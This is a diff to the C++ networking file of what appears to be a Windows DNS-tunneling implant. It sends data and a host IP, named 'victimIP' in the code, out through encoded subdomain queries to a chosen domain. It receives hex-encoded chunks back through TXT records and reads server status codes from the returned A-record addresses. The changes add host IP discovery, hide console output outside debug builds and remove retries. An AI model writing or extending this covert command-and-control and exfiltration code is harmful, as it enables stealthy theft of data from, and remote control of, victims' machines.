@@ -2,26 +2,88 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include "Network.h"
-#include <iostream>
 #include <string>
 #include <sstream>
 #include <iomanip>
 #include <vector>
 #include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windns.h>
+#include <iphlpapi.h>
+
+#ifdef _DEBUG
+#include <iostream>
+#endif
 
 #pragma comment(lib, "Dnsapi.lib") 
 #pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "IPHLPAPI.lib")
 
+// Get Tailscale IP (100.x.x.x) or fallback to any non-loopback IP
+std::string getLocalTailscaleIP() {
+	PIP_ADAPTER_ADDRESSES pAddresses = nullptr;
+	ULONG outBufLen = 15000;
+	
+	pAddresses = static_cast<PIP_ADAPTER_ADDRESSES>(malloc(outBufLen));
+	if (!pAddresses) {
+		return "0.0.0.0";
+	}
+
+	DWORD dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, nullptr, pAddresses, &outBufLen);
+	
+	if (dwRetVal == NO_ERROR) {
+		PIP_ADAPTER_ADDRESSES pCurr = pAddresses;
+		std::string firstNonLoopback = "";
+		
+		while (pCurr) {
+			PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurr->FirstUnicastAddress;
+			while (pUnicast) {
+				if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
+					sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
+					char ip[INET_ADDRSTRLEN];
+					inet_ntop(AF_INET, &(sa_in->sin_addr), ip, INET_ADDRSTRLEN);
+					std::string ipStr(ip);
+					
+					// Priority 1: Tailscale IP (100.x.x.x)
+					if (ipStr.substr(0, 4) == "100.") {
+						free(pAddresses);
+						return ipStr;
+					}
+					
+					// Save first non-loopback IP as fallback
+					if (firstNonLoopback.empty() && ipStr.substr(0, 4) != "127.") {
+						firstNonLoopback = ipStr;
+					}
+				}
+				pUnicast = pUnicast->Next;
+			}
+			pCurr = pCurr->Next;
+		}
+		
+		// Fallback: Return any non-loopback IP
+		if (!firstNonLoopback.empty()) {
+			free(pAddresses);
+			return firstNonLoopback;
+		}
+	}
+	
+	free(pAddresses);
+	return "0.0.0.0";
+}
 
 int startConnection(const char* domain) {
 	if (!domain) {
 		return -1;
 	}
 
-	std::string fullString = "a.1.1.1.";
+	std::string victimIP = getLocalTailscaleIP();
+	
+	std::string fullString = "a.";
+	fullString += victimIP;
+	fullString += ".";
 	fullString += domain;
 	const char* pOwnerName = fullString.c_str();
+	
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord = nullptr;
 	
@@ -49,7 +111,6 @@ int startConnection(const char* domain) {
 	
 	LocalFree(pSrvList);
 	
-	
 	if (status) {
 		return -1;
 	}
@@ -61,6 +122,11 @@ int startConnection(const char* domain) {
 	IN_ADDR ipaddr;
 	ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
 	std::string ipStr = inet_ntoa(ipaddr);
+	
+	#ifdef _DEBUG
+	std::cout << "[Connected] ID from response: " << ipStr << std::endl;
+	#endif
+	
 	DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
 	
 	size_t lastDot = ipStr.rfind(".");
@@ -69,6 +135,7 @@ int startConnection(const char* domain) {
 	}
 	
 	int connectionId = std::stoi(ipStr.substr(lastDot + 1));
+	
 	return connectionId;
 }
 
@@ -97,64 +164,58 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 	DNS_STATUS status;
 	int retCode = -1;
 	
-	for (int i = 0; i < 3; i++) {
-		pDnsRecord = nullptr;
+	// Single attempt - no retry to prevent duplicate packets
+	pDnsRecord = nullptr;
+	
+	status = DnsQuery_A(
+		pOwnerName,
+		wType,
+		DNS_OPTIONS,
+		pSrvList,
+		&pDnsRecord,
+		nullptr
+	);
+	
+	if (!status && pDnsRecord) {
+		IN_ADDR ipaddr;
+		ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
+		std::string ipStr = inet_ntoa(ipaddr);
+		DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
 		
-		status = DnsQuery_A(
-			pOwnerName,
-			wType,
-			DNS_OPTIONS,
-			pSrvList,
-			&pDnsRecord,
-			nullptr
-		);
-		
-		
-		if (!status && pDnsRecord) {
-			IN_ADDR ipaddr;
-			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
-			std::string ipStr = inet_ntoa(ipaddr);
-			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
-			
-			size_t firstDot = ipStr.find(".");
-			if (firstDot == std::string::npos) {
-				goto cleanup;
-			}
-			
-			int code = std::stoi(ipStr.substr(0, firstDot));
-			
-			switch (code) {
-				case 200:  
-					retCode = 0;
-					goto cleanup;
-					
-				case 201:  
-					break;
-					
-				case 202: 
-					{
-						int new_id = startConnection(domain);
-						if (new_id != -1) {
-							id = new_id;
-						}
-					}
-					i--;  
-					break;
-					
-				case 203:  
-					packetNumber = 0;
-					i--;  
-					break;
-					
-				case 204: 
-					goto cleanup;
-					
-				default:
-					goto cleanup;
-			}
+		size_t firstDot = ipStr.find(".");
+		if (firstDot == std::string::npos) {
+			goto cleanup;
 		}
 		
-		Sleep(200); 
+		int code = std::stoi(ipStr.substr(0, firstDot));
+		
+		switch (code) {
+			case 200:  
+				retCode = 0;
+				goto cleanup;
+				
+			case 201:  
+				break;
+				
+			case 202: 
+				{
+					int new_id = startConnection(domain);
+					if (new_id != -1) {
+						id = new_id;
+					}
+				}
+				break;
+				
+			case 203:  
+				packetNumber = 0;
+				break;
+				
+			case 204: 
+				goto cleanup;
+				
+			default:
+				goto cleanup;
+		}
 	}
 	
 cleanup:
@@ -174,10 +235,6 @@ int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain
 	std::string full = fullStream.str();
 	const char* pOwnerName = full.c_str();
 	
-
-	std::cout << "[sendDataTypeC] Query: " << full << std::endl;
-	std::cout << "[sendDataTypeC] Query length: " << full.length() << " chars" << std::endl;
-	
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord = nullptr;
 	
@@ -192,83 +249,62 @@ int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain
 	DNS_STATUS status;
 	int retCode = -1;
 	
-	for (int i = 0; i < 3; i++) {
-		pDnsRecord = nullptr;
-		
-		{
-			std::lock_guard<std::mutex> lock(g_dnsSendMutex);
-			status = DnsQuery_A(
-				pOwnerName,
-				wType,
-				DNS_OPTIONS,
-				pSrvList,
-				&pDnsRecord,
-				nullptr
-			);
-		}
-		
-		
-		if (!status && pDnsRecord) {
-			IN_ADDR ipaddr;
-			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
-			std::string ipStr = inet_ntoa(ipaddr);
-			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
-			
-			std::cout << "[sendDataTypeC] Received IP: " << ipStr << std::endl;
-			
-			size_t firstDot = ipStr.find(".");
-			if (firstDot == std::string::npos) {
-				std::cout << "[sendDataTypeC] ERROR: Invalid IP format" << std::endl;
-				goto cleanup;
-			}
-			
-			int code = std::stoi(ipStr.substr(0, firstDot));
-			std::cout << "[sendDataTypeC] Response code: " << code << std::endl;
-			
-			switch (code) {
-			case 200:  
-				std::cout << "[sendDataTypeC] ✓ Success (200)" << std::endl;
-				retCode = 0;
-				goto cleanup;
-					
-			case 201:  
-				break;
-					
-			case 202: 
-				{
-					int new_id = startConnection(domain);
-					if (new_id != -1) {
-						id = new_id;
-					}
-				}
-				i--;  
-				break;
-					
-			case 203:  
-				packetNumber = 0;
-				i--;  
-				break;
-					
-			case 204: 
-				goto cleanup;
-					
-			default:
-				std::cout << "[sendDataTypeC] Unknown response code: " << code << std::endl;
-				goto cleanup;
-			}
-		} else {
-			std::cout << "[sendDataTypeC] Retry " << (i+1) << "/3 - DNS query failed, status: " << status << std::endl;
-		}
-		
-		Sleep(200); 
+	// Single attempt only - no retry to prevent duplicates
+	pDnsRecord = nullptr;
+	
+	{
+		std::lock_guard<std::mutex> lock(g_dnsSendMutex);
+		status = DnsQuery_A(
+			pOwnerName,
+			wType,
+			DNS_OPTIONS,
+			pSrvList,
+			&pDnsRecord,
+			nullptr
+		);
 	}
 	
-	std::cout << "[sendDataTypeC] All retries failed, returning -1" << std::endl;
 	
-	cleanup:
-		if (pSrvList) {
-			LocalFree(pSrvList);
+	if (!status && pDnsRecord) {
+		IN_ADDR ipaddr;
+		ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
+		std::string ipStr = inet_ntoa(ipaddr);
+		DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
+		
+		size_t firstDot = ipStr.find(".");
+		if (firstDot == std::string::npos) {
+			goto cleanup;
 		}
+		
+		int code = std::stoi(ipStr.substr(0, firstDot));
+		
+		switch (code) {
+		case 200:
+			retCode = 0;
+			break;
+			
+		case 202: 
+			{
+				int new_id = startConnection(domain);
+				if (new_id != -1) {
+					id = new_id;
+				}
+			}
+			break;
+			
+		case 203:  
+			packetNumber = 0;
+			break;
+			
+		default:
+			break;
+		}
+	}
+	
+cleanup:
+	if (pSrvList) {
+		LocalFree(pSrvList);
+	}
 	return retCode;
 }
 
@@ -283,7 +319,7 @@ int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain
 	std::string full = fullStream.str();
 	const char* pOwnerName = full.c_str();
 	
-	WORD wType = DNS_TYPE_TEXT; // DNS TXT record type
+	WORD wType = DNS_TYPE_TEXT;
 	PDNS_RECORD pDnsRecord = nullptr;
 	
 	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
@@ -297,89 +333,75 @@ int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain
 	DNS_STATUS status;
 	int retCode = -1;
 	
-	for (int i = 0; i < 3; i++) {
-		pDnsRecord = nullptr;
-		
-		{
-			std::lock_guard<std::mutex> lock(g_dnsSendMutex);
-			status = DnsQuery_A(
-				pOwnerName,
-				wType,
-				DNS_OPTIONS,
-				pSrvList,
-				&pDnsRecord,
-				nullptr
-			);
-		}
-		
-		
-		if (status == ERROR_SUCCESS && pDnsRecord) {
-
-            if (pDnsRecord->wType == DNS_TYPE_TEXT &&
-                pDnsRecord->Data.TXT.dwStringCount > 0)
-            {
-                std::wstring txtWide = pDnsRecord->Data.TXT.pStringArray[0];
-
-                // TXT rong => het chunk de gui
-                if (txtWide.empty()) {
-                    retCode = 0;
-                    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
-                    goto cleanup;
-                }
-
-                // Windows DNS API pack 2 ASCII char vao moi wchar_t (little-endian)
-                // Tach ca low byte va high byte tu moi wchar_t
-                std::string hexStr;
-                hexStr.reserve(txtWide.length() * 2);
-                for (wchar_t wc : txtWide) {
-                    // Each wchar_t contains 2 bytes: low byte first, then high byte
-                    char lowByte = static_cast<char>(wc & 0xFF);
-                    char highByte = static_cast<char>((wc >> 8) & 0xFF);
-                    
-                    if (lowByte != 0) hexStr += lowByte;
-                    if (highByte != 0) hexStr += highByte;
-                }
-                
-                std::cout << "[DEBUG sendDataTypeP] Received hex: '" << hexStr << "' (length: " << hexStr.length() << ")" << std::endl;
-                
-                // Decode hex to bytes
-                std::string decodedChunk;
-                for (size_t i = 0; i < hexStr.length(); i += 2) {
-                    if (i + 1 < hexStr.length()) {
-                        std::string byteStr = hexStr.substr(i, 2);
-                        char byte = static_cast<char>(std::stoi(byteStr, nullptr, 16));
-                        decodedChunk += byte;
-                    }
-                }
-                
-                // DEBUG: Log decoded result
-                std::cout << "[DEBUG sendDataTypeP] Decoded: '" << decodedChunk << "' (" << decodedChunk.length() << " bytes)" << std::endl;
-                
-                // Convert decoded UTF-8 bytes to wstring for g_outChunk
-                int wlen = MultiByteToWideChar(CP_UTF8, 0, decodedChunk.c_str(), -1, nullptr, 0);
-                if (wlen > 0) {
-                    std::wstring wbuf(wlen - 1, 0);
-                    MultiByteToWideChar(CP_UTF8, 0, decodedChunk.c_str(), -1, &wbuf[0], wlen);
-                    
-                    std::lock_guard<std::mutex> lock(g_outChunkMutex);
-                    g_outChunk = wbuf;
-                }
-
-                retCode = 1; // Có chunk
-                DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
-                goto cleanup;
-            }
-
-            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
-        }
-		
-		Sleep(200); 
+	// Single attempt only - no retry to prevent duplicates
+	pDnsRecord = nullptr;
+	
+	{
+		std::lock_guard<std::mutex> lock(g_dnsSendMutex);
+		status = DnsQuery_A(
+			pOwnerName,
+			wType,
+			DNS_OPTIONS,
+			pSrvList,
+			&pDnsRecord,
+			nullptr
+		);
 	}
 	
-	cleanup:
-		if (pSrvList) {
-			LocalFree(pSrvList);
+	
+	if (status == ERROR_SUCCESS && pDnsRecord) {
+
+		if (pDnsRecord->wType == DNS_TYPE_TEXT &&
+			pDnsRecord->Data.TXT.dwStringCount > 0)
+		{
+			std::wstring txtWide = pDnsRecord->Data.TXT.pStringArray[0];
+
+			if (txtWide.empty()) {
+				retCode = 0;
+				DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
+				goto cleanup;
+			}
+
+			std::string hexStr;
+			hexStr.reserve(txtWide.length() * 2);
+			for (wchar_t wc : txtWide) {
+				char lowByte = static_cast<char>(wc & 0xFF);
+				char highByte = static_cast<char>((wc >> 8) & 0xFF);
+				
+				if (lowByte != 0) hexStr += lowByte;
+				if (highByte != 0) hexStr += highByte;
+			}
+			
+			std::string decodedChunk;
+			for (size_t i = 0; i < hexStr.length(); i += 2) {
+				if (i + 1 < hexStr.length()) {
+					std::string byteStr = hexStr.substr(i, 2);
+					char byte = static_cast<char>(std::stoi(byteStr, nullptr, 16));
+					decodedChunk += byte;
+				}
+			}
+			
+			int wlen = MultiByteToWideChar(CP_UTF8, 0, decodedChunk.c_str(), -1, nullptr, 0);
+			if (wlen > 0) {
+				std::wstring wbuf(wlen - 1, 0);
+				MultiByteToWideChar(CP_UTF8, 0, decodedChunk.c_str(), -1, &wbuf[0], wlen);
+				
+				std::lock_guard<std::mutex> lock(g_outChunkMutex);
+				g_outChunk = wbuf;
+			}
+
+			retCode = 1;
+			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
+			goto cleanup;
 		}
+
+		DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
+	}
+	
+cleanup:
+	if (pSrvList) {
+		LocalFree(pSrvList);
+	}
 	return retCode;
 }
 
